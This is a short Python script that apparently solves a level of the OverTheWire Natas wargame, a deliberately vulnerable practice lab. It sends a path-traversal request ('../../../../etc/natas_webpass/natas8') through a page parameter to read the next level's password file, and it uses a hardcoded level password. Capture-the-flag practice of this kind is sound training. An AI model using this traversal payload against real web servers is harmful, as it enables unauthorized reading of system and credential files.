#!/usr/bin/env python
import requests
import re

url='http://natas7.natas.labs.overthewire.org'
 
username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9' 

req = requests.get(url + '/index.php?page=../../../../etc/natas_webpass/natas8', auth=(username,password))

print(re.findall('<br>\n(.*)\n\n', req.text)[0])
